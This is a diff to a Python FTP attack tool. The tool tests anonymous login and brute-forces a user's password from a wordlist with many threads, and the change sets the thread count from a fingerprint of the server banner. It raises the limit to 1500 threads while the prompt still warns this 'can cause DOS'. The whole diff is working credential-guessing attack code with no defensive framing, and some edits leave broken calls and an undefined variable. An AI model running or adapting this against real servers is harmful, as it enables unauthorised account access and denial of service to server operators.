@@ -25,24 +25,33 @@ def Start0():
 def Start1():
 	ftpTarget = input("Target Host: ")
 	if validIP.match(ftpTarget):
-		ftpCheck(ftpTarget)
-		Start2(ftpTarget)
+		tCode = ftpCheck(ftpTarget)
+		Start2(ftpTarget, tCode)
 	else:
 		print('Please enter a valid IP')
 		Start1()
 
-def Start2(ftpTarget):
+def Start2(ftpTarget, tCode):
 	answeR = input('Select an Option. [1]: ')
 	if(answeR == '' or answeR == '1'):
 		ftpAnon(ftpTarget)
 	elif(answeR == '2'):
-		ftpinitBF(ftpTarget)
+		ftpinitBF(ftpTarget, tCode)
 
 def ftpCheck(ftpTarget):
-	ftp = ftplib.FTP(ftpTarget)
 	try:
-		ftp.connect()
-		return()
+		ftp = ftplib.FTP(ftpTarget)
+		response = ftp.connect()
+		if ('FileZilla' in response):
+			tCode = 400
+		elif ('vsFTPd' in response):
+			tCode = 50
+		elif ('Xlight' in response):
+			tCode = 1500
+		elif ('CompleteFTP' in response):
+		    print('CompleteFTP detected - Adjust wait timer to 6 Seconds.')
+#		ftp.quit()
+		return(tCode)
 	except Exception as E:
 		print('Target Host down or FTP is being filtered by Firewall')
 		Start1()
@@ -60,22 +69,38 @@ def ftpAnon(ftpTarget):
 	except Exception as E:
 		print('Anonymous Login Unsuccessful :(')
 
-def ftpinitBF(ftpTarget):
+def ftpinitBF(ftpTarget, tCode):
 	ftpuName = input('Enter username to BF: ')
 	ftppwFile = input("Password List File: ")
 	if (os.path.isfile (ftppwFile)):
 		answeR = input(('Username: %s - List: %s Loaded. Confirm [Y/n]: ' % (ftpuName, ftppwFile)))
 		if(answeR == '' or answeR == 'y'):
-			ftptCount(ftpTarget, ftpuName, ftppwFile)
+			tCode = ftptCountREC(tCode)
+			if (tCode == 'NO:)'):
+				ftptCount2(ftpTarget, ftpuName, ftppwFile, tCode)
+			else:
+				ftptCount1(ftpTarget, ftpuName, ftppwFile, tCode)
 		elif(answeR == 'n'):
 			ftpinitBF(ftpTarget)
 	else:
 		print('Please enter a valid file')
 		ftpinitBF(ftpTarget)
-		
-def ftptCount(ftpTarget, ftpuName, ftppwFile):
+
+def ftptCountREC(tCode):
+	answeR = input('Use recommended threads based on identified server? [Y/n]: ')
+	if(answeR == '' or answeR == 'y'):
+		print(('Setting threads to [%s].' % (tCode)))
+		return(tCode)
+	elif(answeR == 'n'):
+		return('NO:)')		
+
+def ftptCount1(ftpTarget, ftpuName, ftppwFile,tCode):
+	tCount = tCode
+	ftpBF1(ftpTarget, ftpuName, ftppwFile, tCode)
+	
+def ftptCount2(ftpTarget, ftpuName, ftppwFile,tCode):
 	tCount = int(input('How many threads? 400 MAX - Can cause DOS: '))
-	if tCount in range(1,401):
+	if tCount in range(1,1501):
 		answeR = input(('%s Threads Selected. Continue? [Y/n]:' % (tCount)))
 		if(answeR == '' or answeR == 'y'):
 			ftpBF1(ftpTarget, ftpuName, ftppwFile, tCount)
@@ -110,7 +135,8 @@ def ftpBF2(cB):
 	cheA = cB[1]
 	tG, uNa, tT = cheA
 	uN = uNa.strip()
-	time.sleep(.01)	
+#	time.sleep(.01)	
+	time.sleep(.01)	   
 	try:
 		ftp = ftplib.FTP(tG)
 		ftp.login(uN, pD)
